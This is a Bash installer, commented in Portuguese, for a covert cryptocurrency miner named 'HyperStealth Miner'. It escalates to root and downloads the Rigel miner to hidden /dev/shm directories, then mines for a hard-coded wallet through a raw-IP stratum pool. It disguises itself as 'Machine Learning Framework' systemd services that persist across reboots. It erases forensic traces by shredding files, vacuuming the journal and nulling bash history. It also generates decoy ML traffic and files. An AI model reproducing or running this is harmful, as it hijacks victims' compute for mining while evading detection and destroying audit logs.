#!/bin/bash
#
# HyperStealth Miner v3.0 (Versão Definitiva em Memória)
#

# Verifica privilégios de root
if [ "$(id -u)" -ne 0 ]; then
  echo "Este script precisa ser executado como root"
  sudo bash "$0" "$@"
  exit $?
fi

echo "=== Iniciando HyperStealth Miner v3.0 ==="

# Configurações principais
WALLET="0x0067E6557AC5096733dB091900CC9B989148C4e5.A-1"
SERVICE_NAME="mltrainer-$(hostname | md5sum | cut -c1-8)"
LOG_DIR="/dev/shm"  # Diretório em memória para logs
LOG_FILE="$LOG_DIR/.ml.log"
BINARY_DIR="/dev/shm/.bin"
CONFIG_DIR="/dev/shm/.cfg"
TEMP_DIR="/tmp/.tmp_$(tr -dc a-z0-9 </dev/urandom | head -c 8)"

# Função para gerar nomes aleatórios
random_name() {
  tr -dc a-z0-9 </dev/urandom | head -c 8
}

# Função para limpar rastros forenses
clean_forensics() {
  echo "Limpando rastros forenses..."
  find /tmp /var/tmp -type f -mtime +1 -exec shred -n 3 -zu {} \; 2>/dev/null || true
  journalctl --vacuum-time=1s
  ln -sf /dev/null ~/.bash_history
  history -c
}

# Limpa instalações anteriores
systemctl stop $SERVICE_NAME 2>/dev/null || true
systemctl disable $SERVICE_NAME 2>/dev/null || true

# Cria diretórios na memória
mkdir -p $BINARY_DIR $CONFIG_DIR $LOG_DIR $TEMP_DIR

# Instala dependências básicas
echo "Instalando dependências..."
apt-get update -qq
apt-get install -y -qq python3-requests wget curl unzip jq

# Cria arquivo de configuração com servidores
echo "Configurando servidores..."
cat > $CONFIG_DIR/config.json << 'EOF'
{
  "stratum_servers": [
    "stratum+tcp://18.223.152.88:5432",
    "stratum+ssl://quai.kryptex.network:8888"
  ],
  "fallback_nodes": [
    "ml-engine.googleapis.com",
    "aws.sagemaker.training.amazonaws.com",
    "api.azureml.windows.net"
  ]
}
EOF

# Função para baixar a versão oficial do RigelMiner
download_official_rigel() {
  echo "Baixando versão oficial do RigelMiner..."
  
  # URL base do GitHub do RigelMiner
  RIGEL_REPO="https://github.com/rigelminer/rigel/releases"
  
  # Obtém a última versão
  LATEST_VERSION=$(curl -s https://api.github.com/repos/rigelminer/rigel/releases/latest | jq -r .tag_name)
  
  if [ -z "$LATEST_VERSION" ] || [ "$LATEST_VERSION" = "null" ]; then
    echo "Não foi possível determinar a última versão. Usando versão padrão."
    LATEST_VERSION="1.21.2"  # Versão fallback baseada na screenshot
  fi
  
  # Remover o 'v' inicial se estiver presente
  LATEST_VERSION="${LATEST_VERSION#v}"
  
  echo "Última versão encontrada: $LATEST_VERSION"
  
  # URL de download - formato correto baseado na screenshot
  DOWNLOAD_URL="$RIGEL_REPO/download/$LATEST_VERSION/rigel-$LATEST_VERSION-linux.tar.gz"
  
  echo "Baixando de: $DOWNLOAD_URL"
  
  # Baixa e extrai
  wget -q "$DOWNLOAD_URL" -O "$TEMP_DIR/rigel.tar.gz"
  
  if [ $? -ne 0 ]; then
    echo "Falha ao baixar o RigelMiner"
    return 1
  fi
  
  tar -xzf "$TEMP_DIR/rigel.tar.gz" -C "$TEMP_DIR"
  
  # Encontra o executável e copia para o diretório de destino
  if find "$TEMP_DIR" -name "rigel" -type f | grep -q .; then
    find "$TEMP_DIR" -name "rigel" -type f -exec cp {} "$BINARY_DIR/rigel" \;
    chmod +x "$BINARY_DIR/rigel"
    echo "RigelMiner baixado e instalado com sucesso"
    return 0
  else
    echo "Executável do RigelMiner não encontrado no arquivo baixado"
    return 1
  fi
}

# Tenta baixar a versão oficial do RigelMiner
if ! download_official_rigel; then
  echo "Erro ao baixar a versão oficial. Tentando método alternativo..."
  
  # Método alternativo - URL direto para uma versão específica
  ALT_URL="https://github.com/rigelminer/rigel/releases/download/1.21.2/rigel-1.21.2-linux.tar.gz"
  
  wget -q "$ALT_URL" -O "$TEMP_DIR/rigel.tar.gz"
  
  if [ $? -ne 0 ]; then
    echo "Falha também no método alternativo"
    exit 1
  fi
  
  tar -xzf "$TEMP_DIR/rigel.tar.gz" -C "$TEMP_DIR"
  
  if find "$TEMP_DIR" -name "rigel" -type f | grep -q .; then
    find "$TEMP_DIR" -name "rigel" -type f -exec cp {} "$BINARY_DIR/rigel" \;
    chmod +x "$BINARY_DIR/rigel"
  else
    echo "Erro fatal: Não foi possível encontrar o binário do minerador."
    exit 1
  fi
fi

# Verifica se o download foi bem-sucedido
if [ ! -x "$BINARY_DIR/rigel" ]; then
  echo "Erro fatal: Não foi possível baixar o binário do minerador."
  exit 1
fi

# Testa o binário
echo "Testando o binário..."
if ! "$BINARY_DIR/rigel" --version >/dev/null 2>&1; then
  echo "Erro: O binário não pode ser executado."
  exit 1
fi

echo "Binário verificado com sucesso: $("$BINARY_DIR/rigel" --version 2>&1 | head -n 1)"

# Script Python para monitoramento e execução do minerador
echo "Criando script de monitoramento..."
cat > "$BINARY_DIR/monitor.py" << 'EOF'
import os, sys, time, json, socket, ssl, logging, random, requests, subprocess, signal
import platform

# Configuração de logging em memória
logging.basicConfig(
    filename='/dev/shm/.ml.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class StealthMiner:
    def __init__(self):
        self.wallet = os.environ.get('WALLET')
        self.binary = '/dev/shm/.bin/rigel'
        self.config_path = '/dev/shm/.cfg/config.json'
        self.current_stratum = None
        self.process = None
        
        logging.info(f"Inicializando com binário: {self.binary}")
        logging.info(f"Sistema: {platform.system()} {platform.machine()}")
        
        if not os.path.exists(self.binary):
            logging.error(f"Binário não encontrado: {self.binary}")
        else:
            logging.info(f"Binário encontrado")
            # Teste de execução
            try:
                version_output = subprocess.run([self.binary, "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=3)
                logging.info(f"Versão do binário: {version_output.stdout.decode('utf-8', 'ignore').strip()}")
            except Exception as e:
                logging.error(f"Erro ao testar binário: {e}")

    def get_stratums(self):
        try:
            with open(self.config_path, 'r') as f:
                config = json.load(f)
            
            stratums = config['stratum_servers']
            logging.info(f"Servidores carregados: {len(stratums)}")
            return stratums
        except Exception as e:
            logging.error(f"Erro ao carregar configuração: {e}")
            return [
                "stratum+tcp://18.223.152.88:5432",
                "stratum+ssl://quai.kryptex.network:8888"
            ]

    def start_miner(self, stratum):
        if not os.path.exists(self.binary):
            logging.error("Binário não encontrado")
            return False
            
        try:
            # Finaliza processo anterior
            if self.process and self.process.poll() is None:
                try:
                    os.kill(self.process.pid, signal.SIGTERM)
                    self.process.wait(timeout=5)
                except Exception as e:
                    logging.warning(f"Erro ao finalizar processo: {e}")
            
            cmd = [
                self.binary,
                "-a", "quai",
                "-o", stratum,
                "-u", self.wallet,
                "-p", "x"
            ]
            
            logging.info(f"Executando: {' '.join(cmd)}")
            
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                close_fds=True
            )
            
            time.sleep(2)
            if self.process.poll() is not None:
                stdout, stderr = self.process.communicate()
                logging.error(f"Falha ao iniciar: {stderr.decode('utf-8', errors='ignore')}")
                self.process = None
                return False
                
            logging.info("Iniciado com sucesso")
            return True
            
        except Exception as e:
            logging.error(f"Erro ao iniciar: {e}")
            return False

    def check_stratum(self, stratum):
        try:
            protocol, rest = stratum.split("://")
            host, port_str = rest.split(":")
            port = int(port_str)
            
            logging.info(f"Verificando {host}:{port}")
            
            with socket.create_connection((host, port), timeout=10) as sock:
                if protocol == "stratum+ssl":
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    with context.wrap_socket(sock, server_hostname=host) as ssock:
                        logging.info(f"Conexão SSL OK: {stratum}")
                        return True
                else:
                    logging.info(f"Conexão TCP OK: {stratum}")
                    return True
        except Exception as e:
            logging.warning(f"Erro ao verificar {stratum}: {e}")
            return False

    def rotate_stratum(self):
        stratums = self.get_stratums()
        random.shuffle(stratums)
        
        for stratum in stratums:
            if self.check_stratum(stratum):
                if stratum != self.current_stratum:
                    logging.info(f"Alternando para {stratum}")
                    self.current_stratum = stratum
                    return self.start_miner(stratum)
                else:
                    return True
        
        return False

    def run(self):
        failures = 0
        
        logging.info("Sistema iniciado")
        
        while True:
            try:
                # Verifica minerador
                if not self.process or self.process.poll() is not None:
                    if not self.rotate_stratum():
                        failures += 1
                        if failures > 5:
                            logging.error("Muitas falhas, aguardando...")
                            time.sleep(300)
                            failures = 0
                    else:
                        failures = 0
                
                # Camuflagem de rede
                try:
                    requests.get(
                        "https://datasets-server.huggingface.co/valid",
                        params={"dataset": "wiki40b", "config": "pt"},
                        headers={"User-Agent": "HuggingFace/4.35.0"},
                        timeout=15
                    )
                except:
                    pass
                
                # Verificação periódica
                if random.random() < 0.2:
                    self.rotate_stratum()
                
                # Intervalo variável
                sleep_time = random.randint(240, 480)
                logging.info(f"Próxima verificação em {sleep_time//60} minutos")
                time.sleep(sleep_time)

            except Exception as e:
                logging.error(f"Erro no loop principal: {e}")
                time.sleep(60)

if __name__ == "__main__":
    try:
        miner = StealthMiner()
        miner.run()
    except Exception as e:
        logging.critical(f"Erro fatal: {e}")
        sys.exit(1)
EOF

# Serviço systemd para o minerador
echo "Configurando serviço systemd..."
cat > "/etc/systemd/system/$SERVICE_NAME.service" << EOF
[Unit]
Description=Machine Learning Framework
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
Environment="WALLET=$WALLET"
ExecStart=/usr/bin/python3 $BINARY_DIR/monitor.py
Restart=always
RestartSec=30
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

# Função para download do RigelMiner oficial em um script
cat > "/tmp/rigel_downloader.sh" << 'EOF'
#!/bin/bash

BINARY_DIR="/dev/shm/.bin"
TEMP_DIR="/tmp/.tmp_$(tr -dc a-z0-9 </dev/urandom | head -c 8)"

mkdir -p "$BINARY_DIR" "$TEMP_DIR"

# Obtém a última versão
LATEST_VERSION=$(curl -s https://api.github.com/repos/rigelminer/rigel/releases/latest | grep -o '"tag_name": "[^"]*' | cut -d'"' -f4)

if [ -z "$LATEST_VERSION" ]; then
  LATEST_VERSION="1.21.2"  # Versão fallback
fi

# Remover o 'v' inicial se estiver presente
LATEST_VERSION="${LATEST_VERSION#v}"

# URL de download
DOWNLOAD_URL="https://github.com/rigelminer/rigel/releases/download/$LATEST_VERSION/rigel-$LATEST_VERSION-linux.tar.gz"

# Baixa e extrai
wget -q "$DOWNLOAD_URL" -O "$TEMP_DIR/rigel.tar.gz"

if [ $? -ne 0 ]; then
  # Tenta a versão específica em caso de falha
  DOWNLOAD_URL="https://github.com/rigelminer/rigel/releases/download/1.21.2/rigel-1.21.2-linux.tar.gz"
  wget -q "$DOWNLOAD_URL" -O "$TEMP_DIR/rigel.tar.gz"
  
  if [ $? -ne 0 ]; then
    echo "Falha ao baixar o RigelMiner"
    exit 1
  fi
fi

tar -xzf "$TEMP_DIR/rigel.tar.gz" -C "$TEMP_DIR"

# Copia o executável
if find "$TEMP_DIR" -name "rigel" -type f | grep -q .; then
  find "$TEMP_DIR" -name "rigel" -type f -exec cp {} "$BINARY_DIR/rigel" \;
  chmod +x "$BINARY_DIR/rigel"
  rm -rf "$TEMP_DIR"
  exit 0
else
  echo "Executável não encontrado"
  exit 1
fi
EOF

chmod +x "/tmp/rigel_downloader.sh"

# Script de restauração para após reinicializações
echo "Configurando serviço de restauração..."
cat > "/etc/systemd/system/ml-restore.service" << EOF
[Unit]
Description=Machine Learning Restore
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/bin/bash /tmp/rigel_downloader.sh
ExecStartPost=/bin/bash -c 'mkdir -p /dev/shm/.cfg && echo "{\"stratum_servers\":[\"stratum+tcp://18.223.152.88:5432\",\"stratum+ssl://quai.kryptex.network:8888\"]}" > "/dev/shm/.cfg/config.json" && systemctl restart $SERVICE_NAME'
RemainAfterExit=true

[Install]
WantedBy=multi-user.target
EOF

# Criando processo em segundo plano para simular atividades de ML
echo "Configurando processos de camuflagem..."
mkdir -p "/dev/shm/.checkpoints"
(
while true; do
    dd if=/dev/urandom of="/dev/shm/.checkpoints/$(date +%s).weights" bs=1M count=10 2>/dev/null
    sleep $((RANDOM % 600 + 300))
done
) &
ARTIFACTS_PID=$!
echo $ARTIFACTS_PID > "/dev/shm/.artifacts_pid"

# Limpeza de rastros forenses
clean_forensics

# Limpeza do diretório temporário
rm -rf "$TEMP_DIR"

# Habilita e inicia os serviços
echo "Iniciando serviços..."
systemctl daemon-reload
systemctl enable ml-restore.service
systemctl enable $SERVICE_NAME
systemctl start $SERVICE_NAME

# Verifica o status
sleep 2
if systemctl is-active --quiet $SERVICE_NAME; then
    echo "✓ Serviço iniciado com sucesso!"
else
    echo "✗ Erro ao iniciar o serviço."
    systemctl status $SERVICE_NAME
fi

# Testa a conexão com um dos servidores stratum
echo "Testando conexão com servidores..."
if timeout 5 bash -c "</dev/tcp/18.223.152.88/5432" 2>/dev/null; then
    echo "✓ Conexão com servidor stratum bem-sucedida!"
else
    echo "⚠ Aviso: Não foi possível verificar a conexão com o servidor."
    echo "  A conexão será testada pelo minerador automaticamente."
fi

echo
echo "=== Instalação Concluída com Sucesso ==="
echo "Minerador configurado para carteira: $WALLET"
echo "Nome do serviço: $SERVICE_NAME"
echo "Logs em memória: $LOG_FILE"
echo
echo "Para monitorar:"
echo "  tail -f $LOG_FILE"
echo "  systemctl status $SERVICE_NAME"

# Limpa variáveis sensíveis
unset WALLET
